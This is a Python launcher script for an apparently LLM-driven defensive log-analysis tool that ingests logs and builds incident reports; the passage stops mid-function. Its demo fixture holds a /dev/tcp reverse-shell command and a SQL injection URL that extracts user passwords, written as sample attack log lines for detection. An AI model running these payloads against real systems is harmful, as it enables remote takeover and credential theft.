"""LOG-IT Log Analysis Agent - Universal Autonomous Security Engine

Usage:
  python run.py                     -> Autonomous live monitoring of logs_to_analyze/ & system
  python run.py --file <file_path>  -> Analyze any specific log file (Linux, Windows, Web, Firewall)
  python run.py --dir <dir_path>    -> Analyze all log files in an organization directory
  python run.py --demo              -> Inject live cyber attacks (brute force, reverse shell, SQLi)
  python run.py --report            -> Generate detailed executive report (Markdown & JSON)
  python run.py --status            -> Inspect active agent health and recent alerts
  python run.py --clean             -> Wipe database and reset state for fresh analysis
  python run.py --stop              -> Stop running background agent
"""
from __future__ import annotations

import argparse
import json
import logging
import os
import re
import signal
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

from dotenv import load_dotenv

from core.db.models import AgentFindingModel, AgentStateModel, EventModel
from core.schemas import Event
from shugo_agents.log_analysis.agent import LogAnalysisAgent
from shugo_agents.log_analysis.compliance import build_mitre_heatmap, evaluate_compliance
from shugo_agents.log_analysis.forensics import ForensicLedger, mask_sensitive_data
from shugo_agents.log_analysis.ingest.syslog_server import SyslogServer
from shugo_agents.log_analysis.notifications import SOCNotifier
from shugo_agents.log_analysis.playbooks import get_remediation_playbook
from shugo_agents.log_analysis.soar import ActiveDefenseSOAR
from shugo_agents.log_analysis.web_dashboard import WebSOCDashboardServer
from shugo_agents.log_analysis.ingest.parsers import (
    auto_parse_log_line,
    parse_auth_syslog_line,
    parse_web_log_line,
    parse_windows_event_json,
)

PID_FILE = Path(".agent.pid")
LOG_FILE = Path("logit_analysis.log")


def setup_agent_file_logger() -> None:
    """Ensure all engine operations are cleanly logged to logit_analysis.log."""
    file_handler = logging.FileHandler(LOG_FILE, encoding="utf-8")
    file_handler.setFormatter(
        logging.Formatter("%(asctime)s [%(levelname)s] [%(name)s]: %(message)s")
    )
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    # Avoid duplicate file handlers
    if not any(isinstance(h, logging.FileHandler) for h in root.handlers):
        root.addHandler(file_handler)


def save_pid() -> None:
    PID_FILE.write_text(str(os.getpid()), encoding="utf-8")


def remove_pid() -> None:
    if PID_FILE.is_file():
        try:
            PID_FILE.unlink()
        except Exception:
            pass


def get_running_pid() -> int | None:
    if PID_FILE.is_file():
        try:
            pid = int(PID_FILE.read_text(encoding="utf-8").strip())
            if sys.platform == "win32":
                import ctypes
                kernel32 = ctypes.windll.kernel32
                SYNCHRONIZE = 0x00100000
                process = kernel32.OpenProcess(SYNCHRONIZE, False, pid)
                if process:
                    kernel32.CloseHandle(process)
                    return pid
            else:
                os.kill(pid, 0)
                return pid
        except Exception:
            remove_pid()
    return None


def stop_agent() -> None:
    pid = get_running_pid()
    if not pid:
        print("[!] No active LOG-IT Log Analysis Agent process found.")
        return

    print(f"[*] Stopping LOG-IT Log Analysis Agent (PID {pid})...")
    try:
        if sys.platform == "win32":
            os.system(f"taskkill /PID {pid} /F >nul 2>&1")
        else:
            os.kill(pid, signal.SIGTERM)
        time.sleep(1)
        remove_pid()
        print("[+] Agent stopped successfully.")
    except Exception as e:
        print(f"[-] Failed to stop process {pid}: {e}")


def clean_database_and_state() -> None:
    """Wipe database and reset state tracking to start fresh with 0 events."""
    existing_pid = get_running_pid()
    if existing_pid:
        print(f"[!] Active agent PID {existing_pid} detected. Stopping it first...")
        stop_agent()

    removed: list[str] = []
    targets = [
        "logit_cyber.db",
        "shugo_cyber.db",
        "logit_cyber.db-journal",
        "shugo_cyber.db-journal",
        "tailer_state.json",
    ]
    for fname in targets:
        p = Path(fname)
        if p.exists():
            try:
                p.unlink()
                removed.append(fname)
            except Exception as e:
                print(f"[!] Warning: Could not delete {fname}: {e}")

    print("\n[+] SYSTEM RESET COMPLETE: Previous database & cursor state wiped.")
    if removed:
        for item in removed:
            print(f"    • Removed {item}")
    else:
        print("    • No previous database or cursor files found.")
    print("    • Fresh baseline established (0 events, 0 alerts).\n")


def ingest_custom_file(agent: LogAnalysisAgent, file_path_str: str) -> int:
    """Ingest any organization log file directly."""
    p = Path(file_path_str)
    if not p.is_file():
        print(f"[-] Error: File not found: {p}")
        return 0

    print(f"[*] Ingesting organization log: {p.name} ({p.stat().st_size / 1024:.1f} KB)...")
    ingested = 0
    events_to_add = []
    host_hint = p.stem.replace(".log", "")

    with open(p, "r", encoding="utf-8-sig", errors="replace") as f:
        for line in f:
            if line.strip():
                ev = auto_parse_log_line(line, default_host=host_hint, source_hint=p.name)
                if ev:
                    events_to_add.append(
                        EventModel(
                            id=ev.id,
                            source=ev.source,
                            host=ev.host,
                            timestamp=ev.timestamp,
                            event_type=ev.event_type,
                            raw=ev.raw,
                            normalized=ev.normalized,
                            processed_by=[],
                            created_at=datetime.now(timezone.utc),
                        )
                    )

    if events_to_add:
        with agent.db_manager.session() as session:
            session.add_all(events_to_add)
        ingested = len(events_to_add)

    print(f"[+] Loaded {ingested} events from {p.name} into database.")
    return ingested


def ingest_custom_directory(agent: LogAnalysisAgent, dir_path_str: str) -> int:
    """Recursively discover and ingest all log files from an organization folder."""
    p = Path(dir_path_str)
    if not p.is_dir():
        print(f"[-] Error: Directory not found: {p}")
        return 0

    print(f"[*] Scanning organization log directory: {p.resolve()}...")
    supported_exts = {".log", ".txt", ".json", ".syslog", ".out"}
    total_ingested = 0

    for file_path in p.rglob("*"):
        if file_path.is_file() and file_path.suffix.lower() in supported_exts:
            count = ingest_custom_file(agent, str(file_path))
            total_ingested += count

    print(f"[+] Total: Loaded {total_ingested} events across all discovered log files.")
    return total_ingested


def inject_demo_attacks(agent: LogAnalysisAgent) -> int:
    """Inject authentic attack log lines for instant live demonstration."""
    sample_lines = [
        # SSH Brute Force with Compromise
        "Nov 18 14:00:01 host01 sshd[101]: Failed password for root from 198.51.100.99 port 45123 ssh2",
        "Nov 18 14:00:05 host01 sshd[102]: Failed password for root from 198.51.100.99 port 45124 ssh2",
        "Nov 18 14:00:10 host01 sshd[103]: Failed password for root from 198.51.100.99 port 45125 ssh2",
        "Nov 18 14:00:15 host01 sshd[104]: Failed password for root from 198.51.100.99 port 45126 ssh2",
        "Nov 18 14:00:20 host01 sshd[105]: Failed password for root from 198.51.100.99 port 45127 ssh2",
        "Nov 18 14:00:25 host01 sshd[106]: Accepted password for root from 198.51.100.99 port 45128 ssh2",
        # Reverse Shell Command Execution
        "Nov 18 14:01:00 host01 sudo: attacker : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        # Web SQL Injection Attempt
        '198.51.100.88 - - [18/Nov/2026:14:02:00 +0000] "GET /search.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 1450 "-" "Mozilla/5.0"',
    ]

    events_to_add = []
    for line in sample_lines:
        if "HTTP/1.1" in line:
            ev = parse_web_log_line(line)
        else:
            ev = parse_auth_syslog_line(line)
        if ev:
            events_to_add.append(
                EventModel(
                    id=ev.id,
                    source=ev.source,
                    host=ev.host,
                    timestamp=ev.timestamp,
                    event_type=ev.event_type,
                    raw=ev.raw,
                    normalized=ev.normalized,
                    processed_by=[],
                    created_at=datetime.now(timezone.utc),
                )
            )

    if events_to_add:
        with agent.db_manager.session() as session:
            session.add_all(events_to_add)
    return len(events_to_add)


def get_plain_english_summary(rule: str, entities: dict) -> str:
    """Generate clear, non-technical plain English explanation for new users."""
    rule_lower = rule.lower()
    ips = ", ".join(entities.get("ips", [])) or "an external IP"
    users = ", ".join(entities.get("users", [])) or "user accounts"
    hosts = ", ".join(entities.get("hosts", [])) or "the server"

    if "brute_force_compromise" in rule_lower:
        return (
            f"An attacker at {ips} repeatedly guessed passwords until they successfully logged into '{users}' on {hosts}. "
            f"This account is likely compromised. Immediate session kill, password change, and firewall block are required."
        )
    if "targeted_account_brute_force" in rule_lower:
        return (
            f"Multiple external IP addresses are actively trying to guess passwords for account '{users}'. "
            f"The account is under targeted attack and should be temporarily locked to prevent unauthorized entry."
        )
    if "brute_force" in rule_lower:
        return (
            f"An automated tool at {ips} is launching rapid repeated failed login attempts against {hosts}. "
            f"Block this IP at your firewall immediately to protect server resources and prevent account compromise."
        )
    if "password_spray" in rule_lower:
        return (
            f"An attacker at {ips} tested common passwords against multiple distinct accounts ({users}). "
            f"Attackers use password spraying to avoid lockouts. Block the IP and enforce Multi-Factor Authentication."
        )
    if "reverse_shell" in rule_lower or "dev_tcp" in rule_lower:
        return (
            f"A backdoor reverse shell was executed on {hosts}. An attacker is attempting to obtain an interactive command prompt "
            f"into your server. Isolate {hosts} from the network immediately and terminate the rogue process."
        )
    if "privilege_escalation" in rule_lower or "t1136" in rule_lower or "t1098" in rule_lower:
        return (
            f"A new administrative user or root privilege modification was detected for '{users}' on {hosts}. "
            f"Verify whether this administrator account was authorized by your IT team or created by an intruder."
        )
    if "sql_injection" in rule_lower:
        return (
            f"An external visitor at {ips} submitted database manipulation commands (SQL Injection) in a web request. "
            f"Block the IP address on your Web Application Firewall (WAF) and update the vulnerable code to use prepared statements."
        )
    if "xss" in rule_lower:
        return (
            f"A web visitor at {ips} submitted cross-site scripting (XSS) code targeting user web browsers. Block the IP and sanitize input."
        )
    if "path_traversal" in rule_lower:
        return (
            f"A web request from {ips} attempted to navigate folder paths (e.g. '../') to view sensitive system files. Block the IP."
        )
    if "log_tampering" in rule_lower or "log_cleared" in rule_lower:
        return (
            f"Security log files were deleted or the audit logging daemon was stopped on {hosts}. Intruders do this to erase traces of an attack."
        )
    if "unusual_hours" in rule_lower:
        return (
            f"User '{users}' was active outside of standard established working hours. Confirm if this was authorized off-hours work."
        )
    return f"Security anomaly detected on {hosts} from {ips} that deviates from normal operational baselines."


def generate_html_report(report_data: dict, output_path: Path) -> None:
    """Generate self-contained, interactive HTML dashboard report for new users and executives."""
    threats = report_data.get("threats", [])
    total_events = report_data.get("total_events_analyzed", 0)
    generated_at = report_data.get("generated_at", "")[:19].replace("T", " ") + " UTC"

    crit_count = sum(1 for t in threats if t["severity"].lower() == "critical")
    high_count = sum(1 for t in threats if t["severity"].lower() == "high")
    med_count = sum(1 for t in threats if t["severity"].lower() == "medium")
    low_count = sum(1 for t in threats if t["severity"].lower() in ("low", "info"))

    all_ips = set()
    all_users = set()
    for t in threats:
        for ip in t.get("entities", {}).get("ips", []):
            all_ips.add(ip)
        for u in t.get("entities", {}).get("users", []):
            all_users.add(u)

    threat_cards_html = []
    for idx, t in enumerate(threats, 1):
        sev = t["severity"].lower()
        sev_color = "#ef4444" if sev == "critical" else "#f97316" if sev == "high" else "#eab308" if sev == "medium" else "#3b82f6"
        sev_bg = "rgba(239, 68, 68, 0.15)" if sev == "critical" else "rgba(249, 115, 22, 0.15)" if sev == "high" else "rgba(234, 179, 8, 0.15)" if sev == "medium" else "rgba(59, 130, 246, 0.15)"
        
        ent = t.get("entities", {})
        plain_english = get_plain_english_summary(t["rule"], ent)
        ips_str = ", ".join(ent.get("ips", [])) or "None identified"
        users_str = ", ".join(ent.get("users", [])) or "None identified"
        hosts_str = ", ".join(ent.get("hosts", [])) or "Host System"

        remediation_html = []
        for step in t.get("remediation", []):
            if step.startswith("  •"):
                cmd_part = step.replace("  •", "").strip()
                escaped_cmd = cmd_part.replace('"', '&quot;').replace("'", "&#39;")
                remediation_html.append(f"""
                <div class="cmd-box">
                    <span class="cmd-text">{cmd_part}</span>
                    <button class="copy-btn" onclick="copySnippet(this, '{escaped_cmd}')">📋 Copy</button>
                </div>
                """)
            else:
                remediation_html.append(f"<div class='step-title'>👉 {step}</div>")

        remediation_content = "".join(remediation_html) if remediation_html else "<p>No automated steps available.</p>"

        threat_cards_html.append(f"""
        <div class="card threat-card" data-severity="{sev}">
            <div class="card-header">
                <div>
                    <span class="badge" style="background:{sev_bg}; color:{sev_color}; border:1px solid {sev_color};">
                        {t['severity'].upper()}
                    </span>
                    <span class="badge badge-mitre">MITRE {t.get('mitre_technique') or 'N/A'}</span>
                    <h3 style="margin: 8px 0 4px 0; color: #f8fafc;">#{idx}. {t['rule']}</h3>
                </div>
                <div style="text-align: right; color: #94a3b8; font-size: 0.9em;">
                    Confidence: <strong>{int(t['confidence'] * 100)}%</strong><br>
                    Verdict: <span style="color: {sev_color}; font-weight: bold;">{t['verdict'].upper()}</span>
                </div>
            </div>
            
            <div class="callout-plain">
                <strong>💡 What happened in plain terms:</strong><br>
                {plain_english}
            </div>

            <div class="entity-grid">
                <div class="entity-item">
                    <span class="entity-label">Attacker IP(s)</span>
                    <span class="entity-val" style="color: #f87171;">{ips_str}</span>
                </div>
                <div class="entity-item">
                    <span class="entity-label">Target User(s)</span>
                    <span class="entity-val" style="color: #fbbf24;">{users_str}</span>
                </div>
                <div class="entity-item">
                    <span class="entity-label">Affected Host</span>
                    <span class="entity-val" style="color: #60a5fa;">{hosts_str}</span>
                </div>
            </div>

            <div class="remediation-section">
                <h4 style="margin: 0 0 10px 0; color: #38bdf8;">🛡️ Step-by-Step Action Plan (Click Copy & Run on Your Server):</h4>
                {remediation_content}
            </div>
        </div>
        """)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOG-IT Autonomous Security Findings Report</title>
    <style>
        body {{
            background-color: #0b0f19;
            color: #e2e8f0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 24px;
            line-height: 1.5;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
        }}
        .header {{
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 24px 32px;
            margin-bottom: 24px;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
        }}
        .header h1 {{
            margin: 0 0 8px 0;
            color: #38bdf8;
            font-size: 1.8rem;
            display: flex;
            align-items: center;
            gap: 12px;
        }}
        .header-meta {{
            color: #94a3b8;
            font-size: 0.95rem;
        }}
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }}
        .stat-card {{
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 16px 20px;
            text-align: center;
        }}
        .stat-val {{
            font-size: 2rem;
            font-weight: bold;
            color: #f8fafc;
            margin-bottom: 4px;
        }}
        .stat-label {{
            color: #94a3b8;
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }}
        .guide-box {{
            background: #1e1b4b;
            border: 1px solid #4338ca;
            border-radius: 10px;
            padding: 20px 24px;
            margin-bottom: 28px;
        }}
        .guide-box h3 {{
            margin-top: 0;
            color: #a5b4fc;
        }}
        .guide-steps {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 16px;
            margin-top: 12px;
        }}
        .guide-step {{
            background: rgba(0,0,0,0.25);
            border: 1px solid #3730a3;
            border-radius: 8px;
            padding: 12px 16px;
        }}
        .guide-step strong {{
            color: #c7d2fe;
            display: block;
            margin-bottom: 4px;
        }}
        .filter-bar {{
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }}
        .filter-btn {{
            background: #1e293b;
            color: #cbd5e1;
            border: 1px solid #475569;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
        }}
        .filter-btn.active {{
            background: #0284c7;
            color: white;
            border-color: #38bdf8;
        }}
        .card {{
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 24px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.3);
        }}
        .card-header {{
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            border-bottom: 1px solid #334155;
            padding-bottom: 14px;
            margin-bottom: 16px;
        }}
        .badge {{
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: bold;
            letter-spacing: 0.05em;
        }}
        .badge-mitre {{
            background: #334155;
            color: #cbd5e1;
            border: 1px solid #475569;
            margin-left: 6px;
        }}
        .callout-plain {{
            background: #0f172a;
            border-left: 4px solid #38bdf8;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 16px;
            color: #cbd5e1;
            font-size: 0.95rem;
        }}
        .entity-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 12px;
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 6px;
            padding: 12px 16px;
            margin-bottom: 18px;
        }}
        .entity-label {{
            display: block;
            font-size: 0.75rem;
            color: #94a3b8;
            text-transform: uppercase;
        }}
        .entity-val {{
            font-family: monospace;
            font-size: 0.9rem;
            font-weight: bold;
        }}
        .remediation-section {{
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 8px;
            padding: 16px;
        }}
        .step-title {{
            color: #e2e8f0;
            font-weight: 600;
            margin: 12px 0 6px 0;
            font-size: 0.95rem;
        }}
        .step-title:first-child {{
            margin-top: 0;
        }}
        .cmd-box {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #020617;
            border: 1px solid #1e293b;
            border-radius: 6px;
            padding: 8px 12px;
            margin-bottom: 6px;
            font-family: "Consolas", "Courier New", monospace;
            font-size: 0.85rem;
            color: #a5f3fc;
        }}
        .cmd-text {{
            word-break: break-all;
            margin-right: 12px;
        }}
        .copy-btn {{
            background: #334155;
            color: #f8fafc;
            border: none;
            border-radius: 4px;
            padding: 4px 10px;
            cursor: pointer;
            font-size: 0.8rem;
            white-space: nowrap;
            transition: background 0.2s;
        }}
        .copy-btn:hover {{
            background: #475569;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ LOG-IT Autonomous Security Findings Report</h1>
            <div class="header-meta">
                Generated: <strong>{generated_at}</strong> | Engine: <strong>Google Gemini ({report_data.get('llm_model')})</strong> | Database: <strong>{report_data.get('database')}</strong>
            </div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-val" style="color: #38bdf8;">{total_events}</div>
                <div class="stat-label">Events Analyzed</div>
            </div>
            <div class="stat-card">
                <div class="stat-val" style="color: #ef4444;">{crit_count}</div>
                <div class="stat-label">Critical Threats</div>
            </div>
            <div class="stat-card">
                <div class="stat-val" style="color: #f97316;">{high_count}</div>
                <div class="stat-label">High Severity</div>
            </div>
            <div class="stat-card">
                <div class="stat-val" style="color: #eab308;">{med_count + low_count}</div>
                <div class="stat-label">Medium & Low</div>
            </div>
            <div class="stat-card">
                <div class="stat-val" style="color: #a855f7;">{len(all_ips)}</div>
                <div class="stat-label">Attacker IPs</div>
            </div>
        </div>

        <div class="guide-box">
            <h3>🔰 Quick-Start Incident Response Guide (For New Users)</h3>
            <p style="margin: 0 0 8px 0; color: #cbd5e1; font-size: 0.95rem;">
                If your system was attacked, follow this 3-step playbook for each threat card below:
            </p>
            <div class="guide-steps">
                <div class="guide-step">
                    <strong>1. Stop the Attacker (Immediate)</strong>
                    Click <strong>Copy</strong> on the firewall block command (iptables or Windows Firewall) and paste it into your server terminal to sever the attacker's connection.
                </div>
                <div class="guide-step">
                    <strong>2. Evict Active Sessions</strong>
                    Run the session termination command (<code>pkill</code> or Windows logoff) and immediately change the user password to revoke stolen credentials.
                </div>
                <div class="guide-step">
                    <strong>3. Harden Against Future Attacks</strong>
                    Disable SSH password logins (use SSH keys), enforce Multi-Factor Authentication (MFA), and install <code>fail2ban</code>.
                </div>
            </div>
        </div>

        <div class="filter-bar">
            <button class="filter-btn active" onclick="filterThreats('all', this)">All Threats ({len(threats)})</button>
            <button class="filter-btn" onclick="filterThreats('critical', this)">Critical Only ({crit_count})</button>
            <button class="filter-btn" onclick="filterThreats('high', this)">High Only ({high_count})</button>
            <button class="filter-btn" onclick="filterThreats('medium', this)">Medium & Low ({med_count + low_count})</button>
        </div>

        <div id="threat-list">
            {"".join(threat_cards_html)}
        </div>
    </div>

    <script>
        function copySnippet(btn, text) {{
            const decoded = text.replace(/&quot;/g, '"').replace(/&#39;/g, "'");
            // Extract command if line contains colon
            let cmdToCopy = decoded;
            if (decoded.includes(": ")) {{
                cmdToCopy = decoded.split(": ")[1];
            }}
            navigator.clipboard.writeText(cmdToCopy).then(() => {{
                const originalText = btn.innerText;
                btn.innerText = "✓ Copied!";
                btn.style.backgroundColor = "#10b981";
                setTimeout(() => {{
                    btn.innerText = originalText;
                    btn.style.backgroundColor = "";
                }}, 2000);
            }});
        }}

        function filterThreats(severity, btn) {{
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            const cards = document.querySelectorAll('.threat-card');
            cards.forEach(card => {{
                const cardSev = card.getAttribute('data-severity');
                if (severity === 'all') {{
                    card.style.display = 'block';
                }} else if (severity === 'medium') {{
                    card.style.display = (cardSev === 'medium' || cardSev === 'low') ? 'block' : 'none';
                }} else {{
                    card.style.display = cardSev === severity ? 'block' : 'none';
                }}
            }});
        }}
    </script>
</body>
</html>
"""
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html_content)


def generate_executive_report(agent: LogAnalysisAgent) -> None:
    """Generate detailed markdown, interactive HTML dashboard, and JSON executive security reports."""
    findings_list = []
    with agent.db_manager.session() as session:
        total_events = session.query(EventModel).count()
        records = session.query(AgentFindingModel).order_by(AgentFindingModel.created_at.desc()).all()
        for f in records:
            ent = f.entities if isinstance(f.entities, dict) else {}
            remediation = ent.get("remediation") or get_remediation_playbook(f.rule, f.mitre_technique, ent)
            findings_list.append({
                "id": str(f.id),
                "rule": f.rule,
                "mitre_technique": f.mitre_technique,
                "severity": f.severity,
                "verdict": f.verdict,
                "confidence": f.confidence,
                "reasoning": f.reasoning,
                "entities": ent,
                "remediation": remediation,
                "created_at": f.created_at.isoformat() if hasattr(f.created_at, "isoformat") else str(f.created_at),
            })

    report_data = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "agent": "log_analysis",
        "database": agent.app_config.database.url.split("@")[-1] if "@" in agent.app_config.database.url else agent.app_config.database.url,
        "llm_model": agent.app_config.gemini.model,
        "total_events_analyzed": total_events,
        "total_threats_detected": len(findings_list),
        "threats": findings_list,
    }

    # 1. Save JSON report
    json_path = Path("findings_report.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(report_data, f, indent=2)

    # 2. Save Interactive HTML Report
    html_path = Path("findings_report.html")
    generate_html_report(report_data, html_path)

    # 3. Save Markdown report
    md_path = Path("findings_report.md")
    crit_count = sum(1 for t in findings_list if t["severity"].lower() == "critical")
    high_count = sum(1 for t in findings_list if t["severity"].lower() == "high")
    med_count = sum(1 for t in findings_list if t["severity"].lower() == "medium")
    low_count = sum(1 for t in findings_list if t["severity"].lower() in ("low", "info"))

    md_lines = [
        "# 🛡️ LOG-IT Autonomous Security Findings & Incident Response Report",
        f"\n**Generated**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}  ",
        f"**Total Events Analyzed**: {total_events}  ",
        f"**Total Threats Detected**: {len(findings_list)} (🚨 {crit_count} Critical, ⚠️ {high_count} High, 🟡 {med_count + low_count} Medium/Low)  ",
        f"**AI Reasoning Engine**: Google Gemini ({agent.app_config.gemini.model})  ",
        f"**Interactive Visual Dashboard**: Open `findings_report.html` in your browser for 1-click copyable solutions!  ",
        "\n---\n",
        "## 🔰 Quick-Start Guide for New Users & IT Operators",
        "\nIf you are new to cybersecurity incident response, follow this 3-step workflow:",
        "1. **Step 1 — Immediate Containment**: Copy and run the firewall command (`iptables` or Windows Firewall) to block the attacker IP address.",
        "2. **Step 2 — Evict the Intruder**: Terminate active attacker sessions (`pkill` or logoff) and force an immediate password reset for targeted accounts.",
        "3. **Step 3 — System Hardening**: Disable password authentication for SSH (use SSH keys only), enforce 2-Factor Authentication (2FA), and install `fail2ban`.\n",
        "---\n",
        "## Executive Summary Table\n",
        "| Severity | Rule | Verdict | MITRE ATT&CK | Attacker IPs | Users | Affected Host |",
        "| :--- | :--- | :--- | :--- | :--- | :--- | :--- |",
    ]

    for f in findings_list:
        ips_str = ", ".join(f["entities"].get("ips", [])) or "N/A"
        users_str = ", ".join(f["entities"].get("users", [])) or "N/A"
        hosts_str = ", ".join(f["entities"].get("hosts", [])) or "N/A"
        sev_icon = "🚨" if f['severity'].lower() == "critical" else "⚠️" if f['severity'].lower() == "high" else "🟡"
        md_lines.append(
            f"| {sev_icon} **{f['severity'].upper()}** | `{f['rule']}` | {f['verdict'].upper()} | `{f['mitre_technique'] or 'N/A'}` | `{ips_str}` | `{users_str}` | `{hosts_str}` |"
        )

    md_lines.append("\n---\n")
    md_lines.append("## Detailed Threat Findings & Actionable Remediation\n")

    for idx, f in enumerate(findings_list, 1):
        sev_icon = "🚨" if f['severity'].lower() == "critical" else "⚠️" if f['severity'].lower() == "high" else "🟡"
        plain_summary = get_plain_english_summary(f['rule'], f['entities'])
        
        md_lines.append(f"### {idx}. {sev_icon} [{f['severity'].upper()}] {f['rule']}")
        md_lines.append(f"> 💡 **What happened in simple terms:**  \n> {plain_summary}\n")
        md_lines.append(f"- **Verdict**: `{f['verdict'].upper()}` (Confidence: {int(f['confidence'] * 100)}%)")
        md_lines.append(f"- **MITRE ATT&CK**: `{f['mitre_technique'] or 'N/A'}`")
        ips_str = ", ".join(f["entities"].get("ips", [])) or "None identified"
        users_str = ", ".join(f["entities"].get("users", [])) or "None identified"
        hosts_str = ", ".join(f["entities"].get("hosts", [])) or "Host System"
        md_lines.append(f"- **Attacker IP(s)**: `{ips_str}`")
        md_lines.append(f"- **Target User(s)**: `{users_str}`")
        md_lines.append(f"- **Affected Host**: `{hosts_str}`")
        explanation = f['reasoning'].split('🛡️ Actionable Solutions')[0].strip()
        md_lines.append(f"- **Analytical Evidence**:\n  > {explanation.replace(chr(10), chr(10) + '  > ')}")
        
        if f.get("remediation"):
            md_lines.append("\n#### 🛠️ What You Should Do Right Now (Copy & Paste Commands):")
            for step in f["remediation"]:
                if step.startswith("  •"):
                    raw = step.replace("  •", "").strip()
                    fence = "bash"
                    if ": " in raw:
                        label, cmd = raw.split(": ", 1)
                        if "windows" in label.lower():
                            fence = "powershell"
                        md_lines.append(f"* **{label}:**\n```{fence}\n{cmd}\n```")
                    else:
                        md_lines.append(f"```{fence}\n{raw}\n```")
                else:
                    md_lines.append(f"\n**{step}**")
        md_lines.append("\n---\n")

    # 4. MITRE ATT&CK Matrix & Compliance Evaluation
    mitre_data = build_mitre_heatmap(findings_list)
    compliance_data = evaluate_compliance(findings_list)
    forensic_status = agent.forensic_ledger.verify_integrity()

    report_data["mitre_matrix"] = mitre_data
    report_data["compliance"] = compliance_data
    report_data["forensic_ledger"] = forensic_status

    md_lines.append("## 🗺️ MITRE ATT&CK Matrix Heatmap & Tactical Coverage\n")
    md_lines.append("| ATT&CK Tactic | Active Detections | Techniques Identified | Coverage Status |")
    md_lines.append("| :--- | :--- | :--- | :--- |")
    for row in mitre_data["matrix"]:
        status_badge = "🚨 **ACTIVE THREAT**" if row["active"] else "🟢 Defended / Clear"
        tech_str = ", ".join(row["techniques"]) or "None"
        md_lines.append(f"| **{row['tactic']}** | {row['count']} | `{tech_str}` | {status_badge} |")
    md_lines.append("\n---\n")

    md_lines.append("## 📋 Enterprise Regulatory Compliance Readiness (PCI-DSS, SOC 2, ISO 27001, HIPAA)\n")
    for framework, controls in compliance_data.items():
        md_lines.append(f"### {framework}")
        md_lines.append("| Control ID | Security Requirement | Audit Status | Forensic Evidence |")
        md_lines.append("| :--- | :--- | :--- | :--- |")
        for c in controls:
            md_lines.append(f"| `{c['control_id']}` | {c['description']} | **{c['status']}** | {c['evidence']} |")
        md_lines.append("")
    md_lines.append("---\n")

    md_lines.append("## 🔒 Cryptographic Chain-of-Custody & Forensic Integrity\n")
    ledger_icon = "🟢" if forensic_status["valid"] else "🚨"
    md_lines.append(f"- **Ledger Audit Status**: {ledger_icon} **{'VERIFIED (PASS)' if forensic_status['valid'] else 'INTEGRITY COMPROMISED (FAIL)'}**")
    md_lines.append(f"- **Total Cryptographic Blocks**: `{forensic_status.get('total_blocks', 0)}`")
    md_lines.append(f"- **Latest Merkle Hash**: `{forensic_status.get('latest_hash', 'N/A')}`")
    md_lines.append(f"- **Audit Verification**: {forensic_status.get('message', forensic_status.get('reason', ''))}\n")
    md_lines.append("---\n")

    with open(md_path, "w", encoding="utf-8") as f:
        f.write("\n".join(md_lines))

    # Re-save JSON with full compliance and MITRE data
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(report_data, f, indent=2)

    print("\n" + "=" * 65)
    print("  EXECUTIVE SECURITY REPORT GENERATED")
    print("=" * 65)
    print(f"  Interactive HTML: {html_path.resolve()}")
    print(f"  Markdown Report : {md_path.resolve()}")
    print(f"  JSON Export     : {json_path.resolve()}")
    print(f"  Total Alerts    : {len(findings_list)} threats identified across {total_events} events")
    print("=" * 65 + "\n")



def strip_ansi(text: str) -> str:
    """Remove ANSI color escape sequences to calculate true visible string length."""
    return re.sub(r"\x1b\[[0-9;]*m", "", text)


def make_box_row(label_colored: str, value_colored: str, inner_width: int = 68) -> str:
    """Format a box row with pixel-perfect right border alignment regardless of ANSI colors."""
    vis_label = strip_ansi(label_colored)
    vis_val = strip_ansi(value_colored)
    pad = inner_width - (len(vis_label) + len(vis_val))
    if pad < 0:
        pad = 0
    return f"  │  {label_colored}{value_colored}{' ' * pad}  │"


def play_cyber_log_sentinel_intro(agent: LogAnalysisAgent) -> None:
    """Display high-tech cyber animation for LOG-IT (Autonomous Log Intelligence Agent)."""
    if sys.platform == "win32":
        os.system("")  # Enable ANSI color support in Windows PowerShell & CMD

    C_CYAN = "\033[96m"
    C_GREEN = "\033[92m"
    C_YELLOW = "\033[93m"
    C_GRAY = "\033[90m"
